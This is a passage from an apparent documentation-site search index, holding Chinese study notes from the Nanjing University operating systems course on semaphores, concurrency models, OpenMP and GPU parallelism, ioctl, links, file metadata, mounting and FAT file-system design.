mutex_unlock(\ud83d\udd12);\n}\n</code></pre> <p>\u5982\u679c\u4f7f\u7528 <code>cond_signal(&amp;cv)</code>\uff0c\u5219\u53ea\u4f1a\u968f\u673a\u5524\u9192\u4e00\u4e2a <code>wait</code> \u53ef\u80fd\u5bfc\u81f4\u7a0b\u5e8f\u9519\u8bef</p> <p>\u603b\u800c\u8a00\u4e4b\uff0c\u4e3a\u4e86\u5206\u6790\u4e00\u4e2a\u7a0b\u5e8f\u80fd\u5426\u4f7f\u7528\u5e76\u884c\u8ba1\u7b97\uff0c\u6211\u4eec\u603b\u662f\u6784\u9020\u4e00\u4e2a\u8be5\u7a0b\u5e8f\u5404\u4e2a\u8ba1\u7b97\u4efb\u52a1\u7684\u6709\u5411\u65e0\u73af\u56fe Dependency Graph\u3002\u5982\u679c\u8282\u70b9\u201c\u72ec\u7acb\u8ba1\u7b97\u65f6\u95f4\u201d\u591f\u957f\uff0c\u7b97\u6cd5\u5c31\u662f\u53ef\u4ee5\u9ad8\u6548\u5e76\u884c\u7684\u3002</p> <p>\u4f8b\u5982\u5927\u89c4\u6a21\u52a8\u6001\u89c4\u5212\u95ee\u9898\u5927\u6982\u7387\u662f\u53ef\u4ee5\u9ad8\u6548\u5e76\u884c\u7684\uff0c\u56e0\u4e3a\u52a8\u6001\u89c4\u5212\u67d0\u70b9 \\((i,j)\\) \u7684\u4f9d\u8d56\u5173\u7cfb\u4e00\u822c\u662f\u4f9d\u8d56\u4e8e \\((i-1,j-1), (i-1,j), (i,j-1)\\) \u7684\u3002</p> <p>\u5355\u4e2a\u8ba1\u7b97\u6b65\u9aa4\u8fd0\u7b97\u91cf\u8f83\u5c0f\u7684\u8bdd\uff0c\u53ef\u4ee5\u5c06\u4e00\u7ec4\u8ba1\u7b97\u5408\u5e76\u4f5c\u4e3a\u4e00\u4e2a\u8ba1\u7b97\u8282\u70b9\uff0c\u4ee5\u51cf\u5c0f\u9501\u64cd\u4f5c\u65f6\u95f4\u5360\u6bd4</p>"},{"location":"Accumulation/NJUOS/concurrency/#_7","title":"\u4fe1\u53f7\u91cf","text":"<p>\u4e0d\u540c\u4e8e\u6761\u4ef6\u53d8\u91cf\uff0c\u8fd9\u91cc\u4f9d\u9760\u9501\u7684 Acquire-Release \u5148\u540e\u987a\u5e8f\u5b9e\u73b0\u8ba1\u7b97\u56fe\uff0c\u57fa\u672c\u540c\u6570\u636e\u5e93\u4e2d\u7684\u9501\u4f5c\u7528\u76f8\u540c\u3002</p> <p>\u4e0e\u4e92\u65a5\u9501\u76f8\u6bd4\uff0c\u4fe1\u53f7\u91cf\u6269\u5c55\u4e86\u8d44\u6e90\u201c\u6570\u91cf\u201d\u8fd9\u4e00\u7ef4\u5ea6\uff0c\u9002\u7528\u4e8e\u8ba1\u6570\u8d44\u6e90\u540c\u6b65\u573a\u666f\uff0c\u5176\u6838\u5fc3\u601d\u60f3\u662f\u8d44\u6e90\u53ef\u7528\u6027\u8ba1\u6570\u63a7\u5236\u4e0e\u7ebf\u7a0b\u963b\u585e\u8c03\u5ea6\u673a\u5236\u7ed3\u5408\u3002\u4e24\u4e2a\u57fa\u672c\u64cd\u4f5c\uff1a</p> <ul> <li><code>P()</code>\uff08Proberen\uff0c\u5c1d\u8bd5\uff0c\u4e5f\u79f0\u4e3a <code>wait()</code> \u6216 <code>down()</code>\uff09\uff1a\u5c06\u4fe1\u53f7\u91cf\u503c\u51cf1\u3002\u5982\u679c\u4fe1\u53f7\u91cf\u503c\u5df2\u4e3a0\uff0c\u5219\u963b\u585e\u76f4\u5230\u6709\u8d44\u6e90\u53ef\u7528\u3002</li> <li><code>V()</code>\uff08Verhogen\uff0c\u589e\u52a0\uff0c\u4e5f\u79f0\u4e3a <code>signal()</code> \u6216 <code>up()</code>\uff09\uff1a\u5c06\u4fe1\u53f7\u91cf\u503c\u52a01\u3002\u5982\u679c\u6709\u7ebf\u7a0b\u963b\u585e\u5728\u8be5\u4fe1\u53f7\u91cf\u4e0a\uff0c\u5219\u5524\u9192\u4e00\u4e2a\u3002</li> </ul> \u7279\u6027 \u4e92\u65a5\u9501 (Mutex) \u4fe1\u53f7\u91cf (Semaphore) \u8ba1\u6570\u503c \u53ea\u6709 0 \u6216 1 \u4efb\u610f\u975e\u8d1f\u6574\u6570 \u7528\u9014 \u5b9e\u73b0\u4e92\u65a5 \u5b9e\u73b0\u4e92\u65a5\u548c\u540c\u6b65 \u62e5\u6709\u8005 \u6709\u7ebf\u7a0b\u6240\u6709\u6743 \u6ca1\u6709\u6240\u6709\u6743\u6982\u5ff5 \u64cd\u4f5c\u540d lock/unlock P()/V() \u6216 wait()/signal() \u53ef\u5b9e\u73b0\u7684\u540c\u6b65 \u4e0d\u53ef\u76f4\u63a5\u8868\u793a\u7ebf\u7a0b\u540c\u6b65 \u53ef\u7528\u4e8e\u7ebf\u7a0b\u95f4\u7684\u6267\u884c\u987a\u5e8f\u63a7\u5236\uff08\u4f8b\u5982\u5148\u540e\u6267\u884c\uff09 <p>\u603b\u4e4b\uff0c\u4fe1\u53f7\u91cf\u7684\u4e24\u79cd\u5178\u578b\u5e94\u7528\u5206\u522b\u4e3a\uff1a\u5b9e\u73b0\u4e00\u6b21\u4e34\u65f6\u7684 happens-before \u5173\u7cfb\uff1b\u7ba1\u7406\u8ba1\u6570\u578b\u8d44\u6e90\u3002</p> <p>\u8ba1\u6570\u578b\u8d44\u6e90\uff1a\u505c\u8f66\u573a\u53ea\u6709 n \u4e2a\u4f4d\u7f6e\uff1b\u9910\u5385\u53ea\u6709 n \u4e2a\u684c\u5b50...</p>"},{"location":"Accumulation/NJUOS/concurrency/#bug","title":"\u5e76\u53d1 BUG","text":"<ol> <li>\u6570\u636e\u7ade\u4e89</li> <li>\u6b7b\u9501</li> <li>\u539f\u5b50\u6027\u548c\u987a\u5e8f\u8fdd\u53cd</li> </ol> <p>17 - \u5e76\u53d1 Bugs \u548c\u5e94\u5bf9 [2025 \u5357\u4eac\u5927\u5b66\u64cd\u4f5c\u7cfb\u7edf\u539f\u7406] \u6709\u95f2\u60c5\u518d\u770b</p>"},{"location":"Accumulation/NJUOS/concurrency/#_8","title":"\u4e0d\u540c\u5e94\u7528\u573a\u666f\u4e0b\u7684\u5e76\u53d1\u7f16\u7a0b","text":"<p>\u7528\u6761\u4ef6\u53d8\u91cf\u6216\u8005\u4fe1\u53f7\u91cf\u4f1a\u5728\u5de5\u7a0b\u4ee3\u7801\u4e2d\u5f15\u5165\u4f17\u591a\u5e72\u6270\u4ee3\u7801\u3002\u4e00\u4e9b\u7f16\u7a0b\u8bed\u8a00\u63d0\u4f9b\u4e86\u529f\u80fd\u53d7\u9650\u7684\u8bed\u6cd5\uff0c\u80fd\u591f\u907f\u514d\u5f88\u591a\u95ee\u9898\uff0c\u5176\u672c\u8d28\u4e0a\u4e5f\u662f\u63cf\u8ff0\u8ba1\u7b97\u56fe\u3002</p>"},{"location":"Accumulation/NJUOS/concurrency/#_9","title":"\u9ad8\u6027\u80fd\u8ba1\u7b97","text":"<p>\u9ad8\u6027\u80fd\u8ba1\u7b97\u6e90\u81ea\u6570\u503c\u5bc6\u96c6\u578b\u79d1\u5b66\u8ba1\u7b97\u4efb\u52a1\u3002\u7269\u7406\u4e16\u754c\u5177\u6709\u201c\u7a7a\u95f4\u5c40\u90e8\u6027\u201d\uff0c\u56e0\u6b64\u6a21\u62df\u7269\u7406\u4e16\u754c\u53ef\u4ee5\u5f88\u81ea\u7136\u5730\u8fd0\u7528\u5230\u5e76\u884c\u8ba1\u7b97\u3002</p> <p>HPC \u4e3b\u6d41\u6709\u4e24\u4e2a\u5e93\uff1a</p> <ul> <li>MPI, message passing libraries</li> <li>OpenMP</li> </ul> <pre><code>#ifdef OMP\n#include &lt;omp.h&gt;\n#endif\n\n#pragma omp parallel num_threads(128)\nfor (int i; i &lt; 1024; i++) {\n}\n</code></pre> <p>\u4f7f\u7528 <code>omp.h</code>\uff0c\u7f16\u8bd1\u65f6\u8981\u52a0\u4e0a <code>-fopenmp</code> \u7f16\u8bd1\u9009\u9879\uff0c\u4e0d\u7136\u4f1a\u5ffd\u89c6 <code>#pragma</code></p>"},{"location":"Accumulation/NJUOS/concurrency/#web","title":"WEB","text":"<p>\u4e3b\u8981\u662f Javascript \u53d1\u5c55\u81f3\u4eca\u5404\u79cd\u5e93\u4f7f\u7528\u5404\u79cd\u4e0d\u540c\u7684\u8bed\u6cd5\u8bbe\u7f6e\u8ba1\u7b97\u56fe\u3002\u73b0\u4ee3\u524d\u7aef\u4ee3\u8868\u4f5c\u54c1\uff1a</p> <ul> <li>Angular\u3001React\u3001Vue</li> <li>Express.js\u3001Next.js</li> <li>Bootstrap\u3001Tailwindcss</li> <li>Electron</li> <li>asm.js\uff08\u5305\u62ec WebAssembly\uff09</li> </ul>"},{"location":"Accumulation/NJUOS/concurrency/#_10","title":"\u6570\u636e\u4e2d\u5fc3","text":"<p>\u6570\u636e\u4e2d\u5fc3\u7a0b\u5e8f\u4ee5\u6d77\u91cf\u5206\u5e03\u5f0f\u6570\u636e\u5b58\u50a8\u4e3a\u4e2d\u5fc3\uff0c\u652f\u6301\u5b9e\u65f6\u7684\u5c0f\u6570\u636e\u5904\u7406\u4ee5\u53ca\u79bb\u7ebf\u7684\u5927\u6570\u636e\u5904\u7406\uff0c\u8981\u6c42\u9ad8\u541e\u5410\u3001\u4f4e\u5ef6\u8fdf\u7684\u591a\u526f\u672c\u5206\u5e03\u5f0f\u5b58\u50a8\u4e0e\u8ba1\u7b97\u3002</p> <ul> <li>\u591a\u7ebf\u7a0b/\u591a\u8fdb\u7a0b\u5e76\u53d1\u6a21\u578b\uff1a\u7528\u4e8e\u8282\u70b9\u5185\u9ad8\u5e76\u53d1\u5904\u7406\uff08\u5982 Java \u7684\u7ebf\u7a0b\u6c60\u3001Go \u7684 goroutine\uff09</li> <li>\u4e8b\u4ef6\u9a71\u52a8\u6a21\u578b\uff08Reactor \u6a21\u5f0f\uff09\uff1a\u5982 Nginx\u3001Netty \u7b49\u7528\u4e8e\u9ad8\u5e76\u53d1 I/O \u8bf7\u6c42\u7684\u7ec4\u4ef6</li> <li>\u6d88\u606f\u961f\u5217\u5f02\u6b65\u901a\u4fe1\uff1a\u5982 Kafka\u3001RabbitMQ \u7528\u4e8e\u670d\u52a1\u89e3\u8026\u4e0e\u5f02\u6b65\u5904\u7406</li> <li>\u6570\u636e\u6d41\u6a21\u578b\uff1a\u5982 Apache Beam \u5b9a\u4e49\u7edf\u4e00\u7684\u6570\u636e\u5904\u7406\u8bed\u4e49\uff0c\u652f\u6301\u6709\u72b6\u6001\u6d41\u5904\u7406\u5e76\u53d1</li> <li>MapReduce \u53ca\u5176\u6f14\u8fdb\uff1a\u901a\u8fc7\u5bf9\u6570\u636e\u5207\u5206\u3001\u4efb\u52a1\u5212\u5206\uff0c\u5929\u7136\u652f\u6301\u5e76\u884c\u5316\u6267\u884c</li> </ul>"},{"location":"Accumulation/NJUOS/concurrency/#gpu","title":"GPU","text":"<p>GPU \u5c5e\u4e8e Single Instruction Multiple Threads\u3002</p> <pre><code>__device__ int *map;\n\n// row: [1 -&gt; 1080]\n// col: [1 -&gt; 1920]\nvoid kernel(int row, int col) {\n    color = ...; // \u4efb\u610f C \u4ee3\u7801\n    map[row * 1920 + col] = color;\n}\n</code></pre> <p>\u5bf9\u4e8e\u4e00\u822c CPU \u7684\u60f3\u6cd5\uff0c\u6211\u4eec\u4f7f\u7528\u4e24\u5c42\u5faa\u73af\u904d\u5386\u884c\u5217\uff0c\u6bcf\u6b21\u90fd\u8c03\u7528 kernel\uff1a</p> <pre><code>for (int row = 1; row &lt;= 1080; row++)\n    for (int col = 1; col &lt;= 1920; col++)\n        kernel(row, col);\n</code></pre> <p>\u800c\u5bf9\u4e8e\u73b0\u4ee3 GPU\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u542f\u52a8 1920*1080 \u4e2a\u7ebf\u7a0b\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u8c03\u7528 kernel\u3002</p>"},{"location":"Accumulation/NJUOS/persistence/","title":"\u6301\u4e45\u5316\u5b58\u50a8","text":""},{"location":"Accumulation/NJUOS/persistence/#_1","title":"\u6301\u4e45\u5316","text":"<p> \u7ea6 2126 \u4e2a\u5b57  27 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p>"},{"location":"Accumulation/NJUOS/persistence/#_2","title":"\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f","text":"<p>\u7528\u6237\u7a0b\u5e8f\u4e0d\u5e94\u8be5\u80fd\u591f\u76f4\u63a5\u8bfb\u53d6\u5bc4\u5b58\u5668\u6216 IO \u603b\u7ebf\u4e2d\u7684\u6570\u636e\uff0c\u6211\u4eec\u5c06\u8fde\u63a5\u5230\u603b\u7ebf\u4e0a\u7684\u8bbe\u5907\u201c\u865a\u62df\u5316\u201d\u4e3a\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u7684\u65b9\u5f0f\u4e0e\u8bbe\u5907\u8fdb\u884c\u6570\u636e\u4ea4\u4e92\u3002</p> <p>\u865a\u62df\u6587\u4ef6\u4e3e\u4f8b\uff1a</p> <ul> <li><code>/dev/pts/[x]</code> pseudo terminal\uff0c\u4f2a\u7ec8\u7aef\u63a5\u53e3</li> <li><code>/dev/zero</code>, <code>/dev/null</code>, <code>/dev/random</code>\uff0c\u63d0\u4f9b\u7279\u5b9a\u884c\u4e3a\u7684\u6570\u636e\u6d41\u8bbe\u5907</li> <li><code>/proc/stat</code>\uff0c\u63d0\u4f9b\u5185\u6838\u72b6\u6001\u7684\u53ea\u8bfb\u865a\u62df\u63a5\u53e3\uff0c\u5c5e\u4e8e\u865a\u62df\u6587\u4ef6\u7cfb\u7edf\u7684\u4e00\u90e8\u5206</li> </ul> <p>Tip</p> <p>\u8fd9\u4e9b\u8bbe\u5907\u6587\u4ef6\u672c\u8d28\u4e0a\u5e76\u4e0d\u5bf9\u5e94\u78c1\u76d8\u4e0a\u7684\u5b9e\u9645\u6587\u4ef6\uff0c\u800c\u662f\u7531\u5185\u6838\u901a\u8fc7\u6302\u8f7d\u865a\u62df\u6587\u4ef6\u7cfb\u7edf\uff08\u5982 devfs, procfs\uff09\u52a8\u6001\u751f\u6210\uff0c\u5e76\u6620\u5c04\u5230\u5bf9\u5e94\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u6240\u7ba1\u7406\u7684\u786c\u4ef6\u6216\u5185\u6838\u8d44\u6e90\u3002</p> <p>\u4f46\u662f\u8bbe\u5907\u4e0d\u4ec5\u4ec5\u662f\u6570\u636e\uff0c\u8fd8\u8981\u5305\u62ec\u5b83\u4eec\u7684\u914d\u7f6e\uff0c\u4e00\u822c\u6709\u4e24\u79cd\u5b9e\u73b0\u65b9\u6cd5\uff1a</p> <ul> <li>&lt;1&gt; \u63a7\u5236\u4f5c\u4e3a\u6570\u636e\u6d41\u7684\u4e00\u90e8\u5206(ANSI Escape Code)</li> <li>&lt;2&gt; \u63d0\u4f9b\u4e00\u79cd\u65b0\u7684\u63a5\u53e3(request-response)</li> </ul> <p>\u5728 UNIX \u7cfb\u7edf\u4e2d\uff0c\u51e0\u4e4e\u6240\u6709\u8bbe\u5907\u7684\u914d\u7f6e\u64cd\u4f5c\u90fd\u4f9d\u8d56\u4e8e\u7cfb\u7edf\u8c03\u7528 <code>ioctl</code>\uff0c\u5373 I/O Control\uff0c\u5141\u8bb8\u7528\u6237\u901a\u8fc7\u6587\u4ef6\u63cf\u8ff0\u7b26\u5411\u8bbe\u5907\u9a71\u52a8\u53d1\u9001\u5b9a\u5236\u5316\u7684\u6307\u4ee4\u3002\u6bcf\u4e00\u4e2a\u8bbe\u5907\u62e5\u6709\u81ea\u5df1\u5b9a\u4e49\u7684\u4e00\u7ec4 <code>request</code> \u7f16\u7801\uff0c\u8fd9\u4e5f\u4f7f\u5f97 <code>ioctl</code> \u6210\u4e3a\u4e86\u4e00\u4e2a\u5806\u53e0\u7684\u5c4e\u5c71 \u2014\u2014 \u6ca1\u6709\u7edf\u4e00\u89c4\u8303\uff0c\u6781\u5ea6\u8bbe\u5907\u76f8\u5173\uff0c\u51e0\u4e4e\u6bcf\u4e2a\u9a71\u52a8\u90fd\u91cd\u65b0\u9020\u8f6e\u5b50\u3002</p> <pre><code>/// man 2 io\n#include &lt;sys/ioctl.h&gt;\n/// control device\nint ioctl(int fd, unsigned long request, ...);\n</code></pre> <p>\u8c03\u7528 <code>ioctl(fd, request, ...)</code> \u4f1a\u5c06\u547d\u4ee4 <code>request</code> \u548c\u76f8\u5173\u53c2\u6570\u4f20\u9012\u5230\u5185\u6838\u4e2d\u5bf9\u5e94\u8bbe\u5907\u9a71\u52a8\u7684\u63a7\u5236\u5206\u652f\u903b\u8f91\u4e2d\u3002<code>request</code> \u901a\u5e38\u662f\u901a\u8fc7\u5b8f\u5982 <code>_IO</code>, <code>_IOR</code>, <code>_IOW</code>, <code>_IOWR</code> \u7b49\u6784\u9020\u7684\u7f16\u7801\uff0c\u5c01\u88c5\u4e86\u8bbe\u5907\u7c7b\u578b\u3001\u64cd\u4f5c\u7f16\u53f7\u3001\u53c2\u6570\u5927\u5c0f\u7b49\u4fe1\u606f\u3002</p> <p>WSL1 \u5c31\u662f\u56e0\u4e3a\u96be\u4ee5\u517c\u5bb9\u6240\u6709\u8bbe\u5907\u6240\u4ee5\u4e0d\u518d\u4f7f\u7528\uff0c\u5982\u679c\u60f3\u5b8c\u6574\u590d\u523b\u6574\u5957 <code>ioctl</code>\uff0c\u4e0d\u5982\u76f4\u63a5\u5f04\u6210\u865a\u62df\u673a</p> <p><code>ioctl</code> \u7684\u6ee5\u7528\u5bfc\u81f4\u8bbe\u5907\u884c\u4e3a\u4e0d\u518d\u62bd\u8c61\u7edf\u4e00\uff0c\u6210\u4e3a\u4e25\u91cd\u7684\u53ef\u79fb\u690d\u6027\u95ee\u9898\u3002WSL1 \u57fa\u4e8e syscall \u8f6c\u53d1\u673a\u5236\uff0c\u96be\u4ee5\u6a21\u62df\u6240\u6709 Linux \u9a71\u52a8\u884c\u4e3a\uff0c\u5c24\u5176\u662f\u6d89\u53ca <code>ioctl</code> \u7684\u5730\u65b9\u3002\u800c\u865a\u62df\u673a\u5219\u53ef\u4ee5\u76f4\u63a5\u8fd0\u884c\u5b8c\u6574 Linux \u5185\u6838\uff0c\u81ea\u7136\u652f\u6301\u6240\u6709\u5185\u6838 API \u4e0e\u9a71\u52a8\u903b\u8f91\uff0c\u907f\u514d\u6b64\u7c7b\u517c\u5bb9\u6027\u56f0\u5883\u3002</p>"},{"location":"Accumulation/NJUOS/persistence/#_3","title":"\u6587\u4ef6\u7cfb\u7edf","text":"<p>\u5728\u5b58\u50a8\u5668\u4e4b\u4e0a\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5b9e\u73b0\u4e86\u201c\u76ee\u5f55\u6811\u201d\u7ed3\u6784\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u662f\u6211\u4eec\u80fd\u591f\u4ee5\u4e00\u79cd\u76f4\u89c2\u3001\u81ea\u7136\u3001\u6709\u5e8f\u7684\u65b9\u5f0f\u7ba1\u7406\u64cd\u4f5c\u7cfb\u7edf\u91cc\u6570\u4ee5\u767e\u8ba1\u7684\u6301\u4e45\u5316\u5bf9\u8c61\u3002</p>"},{"location":"Accumulation/NJUOS/persistence/#api","title":"\u6587\u4ef6\u7cfb\u7edf API","text":"<p>\u968f\u7740\u64cd\u4f5c\u7cfb\u7edf\u7684\u6587\u4ef6\u8d8a\u6765\u8d8a\u591a\uff0c\u9010\u6e10\u5f62\u6210\u4e00\u4e9b\u7ea6\u5b9a\u4fd7\u6210\u7684\u76ee\u5f55\u7ed3\u6784\uff0c\u4f8b\u5982 Linux FHS (Filesystem Hierarchy Standard)\u3002</p> <p>\u6587\u4ef6\u7cfb\u7edf\u4e2d\uff0c\u786c\u94fe\u63a5\u5141\u8bb8\u4e00\u4e2a\u6587\u4ef6\u88ab\u591a\u4e2a\u76ee\u5f55\u6761\u76ee\u540c\u65f6\u5f15\u7528\uff0c\u53ef\u4ee5\u76f8\u5f53\u4e8e\u591a\u4e2a\u201c\u6b63\u5f0f\u5165\u53e3\u201d\uff0c\u672c\u8d28\u4e0a\u662f\u591a\u4e2a\u76ee\u5f55\u9879\u6307\u5411\u540c\u4e00\u4e2a inode\u3002\u5bf9\u4efb\u610f\u4e00\u4e2a\u786c\u94fe\u63a5\u7684\u4fee\u6539\uff0c\u90fd\u4f1a\u5f71\u54cd\u540c\u4e00\u4e2a\u7269\u7406\u6587\u4ef6\u3002\u4f7f\u7528 <code>ls -i</code> \u67e5\u770b\u786c\u94fe\u63a5\uff0c\u4f1a\u53d1\u73b0\u5b83\u4eec\u5177\u6709\u76f8\u540c\u7684 inode \u7f16\u53f7\uff1a</p> <pre><code>$ ln a.txt b.txt\n$ ls -i a.txt b.txt\n327681 a.txt\n327681 b.txt  # inode \u76f8\u540c\uff0c\u8bf4\u660e\u662f\u786c\u94fe\u63a5\n</code></pre> <p>\u800c\u8f6f\u8fde\u63a5(\u7b26\u53f7\u94fe\u63a5)\u5219\u76f8\u5f53\u4e8e\u201c\u5feb\u6377\u65b9\u5f0f\u201d\uff0c\u5b83\u521b\u5efa\u4e00\u4e2a\u65b0\u6587\u4ef6\u5e76\u5c06\u53e6\u4e00\u4e2a\u6587\u4ef6\u7684\u7edd\u5bf9/\u76f8\u5bf9\u8def\u5f84\u4ee5\u6587\u672c\u5f62\u5f0f\u5b58\u50a8\u5728\u6587\u4ef6\u91cc\uff0c\u56e0\u6b64\u53ef\u4ee5\u8de8\u6587\u4ef6\u7cfb\u7edf\uff0c\u4e5f\u53ef\u4ee5\u7528\u6765\u94fe\u63a5\u76ee\u5f55\uff1a</p> <pre><code>$ ln -s /etc/hosts myhosts  # \u8f6f\u94fe\u63a5\uff0c\u4e0d\u8981\u6c42\u76ee\u6807\u5b58\u5728\n$ ls -l myhosts\nlrwxrwxrwx 1 alice staff 10 Mar 10 12:35 myhosts -&gt; /etc/hosts\n</code></pre> <p>\u94fe\u63a5\u6307\u5411\u7684\u4f4d\u7f6e\u4e5f\u672a\u5fc5\u9700\u8981\u5b58\u5728\uff0c\u5373\u5b83\u53ef\u4ee5\u6307\u5411\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u6587\u4ef6</p> <p>\u6587\u4ef6\u662f\u64cd\u4f5c\u7cfb\u7edf\u7684\u5bf9\u8c61\uff0c\u6240\u6709\u6587\u4ef6\u90fd\u6709\u5176\u5143\u6570\u636e\uff0c\u6216\u79f0\u4e3a\u5c5e\u6027\uff0c\u4e00\u822c\u53ef\u4ee5\u901a\u8fc7 <code>ls -l / ll</code> \u8fdb\u884c\u67e5\u770b\u3002\u5143\u6570\u636e\u6309\u7167\u4ece\u5de6\u5230\u53f3\uff1a</p> <ul> <li>Type: d(directory), l(link), p(pipe), c(char), b(block)</li> <li>Mode: rwx\uff0c\u5171\u4e09\u7ec4\uff0c\u5bf9\u5e94 user, group, other<ul> <li>\u4f8b\u5982 0o755 = rwx(111) r-x(101) r-x(101)</li> </ul> </li> <li>Links: \u5f15\u7528\u8ba1\u6570\uff0c\u5305\u62ec\u786c\u94fe\u63a5\u3001\u76ee\u5f55(<code>..</code>)</li> </ul> <pre><code>$ ls -l example.txt\n-rw-r--r-- 1     alice staff 1024 Mar 10 12:34 example.txt\n# mode     link  owner group size modified     name\n</code></pre> <p>\u4e00\u4e2a\u5757\u8bbe\u5907\u4e2d\u53ef\u80fd\u5df2\u6709\u76ee\u5f55\u7ed3\u6784\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>mount</code> \u547d\u4ee4\u5c06\u5176\u6302\u8f7d\u5230\u5df2\u6709\u7684\u76ee\u5f55\u4e2d\uff1a</p> <pre><code>$ mount /dev/sdb1 /mnt/usb\n$ ls /mnt/usb  # \u67e5\u770b\u6302\u8f7d\u540e\u7684\u5185\u5bb9\n</code></pre> <p>\u5c06\u4e0d\u652f\u6301 FHS \u7684\u6587\u4ef6\u7cfb\u7edf(\u4f8b\u5982 FAT)\u6302\u8f7d\u5230 Linux \u4e2d\uff0c\u6240\u6709\u6587\u4ef6\u9ed8\u8ba4\u6743\u9650\u4e3a <code>777</code>\uff0c\u5373\u505a\u6700\u4fdd\u5b88\u5224\u65ad</p> <p>\u5b58\u50a8\u8bbe\u5907\u683c\u5f0f\u5316\u5176\u5b9e\u4e5f\u53ea\u662f\u628a\u8bbe\u5907\u4e2d\u7684\u76ee\u5f55\u6811\u6e05\u7a7a\uff0c\u4f46\u539f\u6570\u636e\u4ecd\u7136\u5728\u76d8\u4e2d\uff0c\u5982\u679c\u5b58\u5728\u955c\u50cf\u5219\u53ef\u4ee5\u6062\u590d</p>"},{"location":"Accumulation/NJUOS/persistence/#_4","title":"\u6587\u4ef6\u7cfb\u7edf\u5b9e\u73b0","text":"<p>\u6587\u4ef6\u7cfb\u7edf\u4e3a\u6211\u4eec\u5b9e\u73b0\u4e86\u6811\u72b6\u7684\u76ee\u5f55\u7ed3\u6784\uff0c\u5e76\u63d0\u4f9b\u4e86\u4e30\u5bcc\u7684 API \u8ba9\u6211\u4eec\u80fd\u591f\u589e\u5220\u6539\u67e5\u3002\u5b9e\u9645\u4e0a\uff0c\u6587\u4ef6\u7cfb\u7edf\u5c31\u662f\u5728\u5b58\u50a8\u7cfb\u7edf\uff08Block I/O\uff09\u4e4b\u4e0a\u5b9e\u73b0\u7684\u4e00\u4e2a\u652f\u6301\u4fee\u6539\u67e5\u8be2\u7684\u6570\u636e\u7ed3\u6784\u3002</p> <pre><code>struct FSObject {\n    virtual ~FSObject() = default;\n};\n\nstruct File : FSObject {\n    vector&lt;char&gt; content;\n};\n\nstruct Directory : FSObject {\n    map&lt;string, unique_ptr&lt;FSObject&gt;&gt; children;\n};\n</code></pre> <p>\u533a\u522b\u5728\u4e8e\uff0c\u5e95\u5c42\u5757\u8bbe\u5907\u7684\u8bbf\u95ee\u5355\u4f4d\u662f \u56fa\u5b9a\u5927\u5c0f\u7684\u5757\uff08block\uff09\uff0c\u4e5f\u5c31\u662f\u6240\u8c13\u7684 Block I/O\uff0c\u4e0d\u652f\u6301\u50cf\u5185\u5b58\u90a3\u6837\u7684 Random Access\u3002\u56e0\u6b64\uff0c\u5373\u4fbf\u6211\u4eec\u53ea\u60f3\u8981\u67d0\u4e2a\u5b57\u8282\u7684\u6570\u636e\uff0c\u4e5f\u5fc5\u987b\u5c06\u5176\u6240\u5728\u7684\u6574\u4e2a\u5757\u8bfb\u5165\u5185\u5b58\uff0c\u5f62\u6210\u8bfb\u653e\u5927\uff08Read Amplification\uff09\uff1b\u5199\u5165\u4e00\u4e2a\u5b57\u8282\uff0c\u4e5f\u5fc5\u987b\u91cd\u5199\u6574\u4e2a\u5757\uff0c\u5f62\u6210\u5199\u653e\u5927\uff08Write Amplification\uff09\u3002</p> <p>\u73b0\u4ee3\u6587\u4ef6\u7cfb\u7edf\u67b6\u6784\uff08Logical Volume Manager, LVM\uff09</p> <p></p> <ul> <li>\u652f\u6301\u903b\u8f91\u5377\u62bd\u8c61\u3001\u5feb\u7167\u3001\u5206\u5c42\u5b58\u50a8\u7b49\u7279\u6027  </li> <li>\u5728\u7269\u7406\u8bbe\u5907\u4e0e\u6587\u4ef6\u7cfb\u7edf\u4e4b\u95f4\u5f15\u5165\u62bd\u8c61\u5c42</li> </ul>"},{"location":"Accumulation/NJUOS/persistence/#fat","title":"FAT","text":"<p>\u5728\u65e9\u671f\uff08\u5982\u8f6f\u76d8\uff09\u4e2d\uff0c\u5b58\u50a8\u5bb9\u91cf\u8f83\u5c0f\uff0c\u4e00\u4e2a\u78c1\u76d8\u4e2d\u53ef\u80fd\u4ec5\u6709\u51e0\u767e\u4e2a Sector\uff0c\u8fd9\u65f6\u9009\u7528\u7b80\u5355\u7684\u94fe\u8868\u7ed3\u6784\u53cd\u800c\u66f4\u9ad8\u6548\u3002\u94fe\u8868\u4f5c\u4e3a\u6570\u636e\u7ed3\u6784\u7684\u4e24\u79cd\u8bbe\u8ba1\u65b9\u6848\uff1a</p> <ul> <li>&lt;1&gt; \u9690\u5f0f\u94fe\u8868\uff1a\u5728\u6bcf\u4e2a\u6570\u636e\u5757\u672b\u5c3e\u5b58\u653e\u6307\u5411\u4e0b\u4e00\u4e2a\u5757\u7684\u6307\u9488<ul> <li>\u2705 \u5b9e\u73b0\u7b80\u5355\uff0c\u4e0d\u9700\u989d\u5916\u7a7a\u95f4</li> <li>\u274c \u5757\u5927\u5c0f\u4e0d\u662f \\(2^k\\) \u4e0d\u5229\u4e8e\u786c\u4ef6\u4f18\u5316\uff1b\u968f\u673a\u8bbf\u95ee\u6548\u7387\u6781\u5dee</li> </ul> </li> <li>&lt;2&gt; \u663e\u5f0f\u94fe\u8868\uff08FAT\uff09\uff1a\u6240\u6709\u5757\u6307\u9488\u96c6\u4e2d\u5b58\u653e\u5728\u4e00\u4e2a\u8fde\u7eed\u533a\u57df\u4e2d<ul> <li>\u2705 \u7ed3\u6784\u6e05\u6670\u3001\u4fbf\u4e8e\u7f13\u5b58\uff1b\u652f\u6301\u5feb\u901f\u67e5\u627e\u548c\u8df3\u8f6c</li> <li>\u274c FAT \u533a\u82e5\u635f\u574f\uff0c\u6574\u4e2a\u6587\u4ef6\u7cfb\u7edf\u96be\u4ee5\u4fee\u590d</li> </ul> </li> </ul> <p>\u4e8c\u8005\u5bf9\u6bd4\uff0c\u80af\u5b9a\u9009\u7528\u65b9\u6848 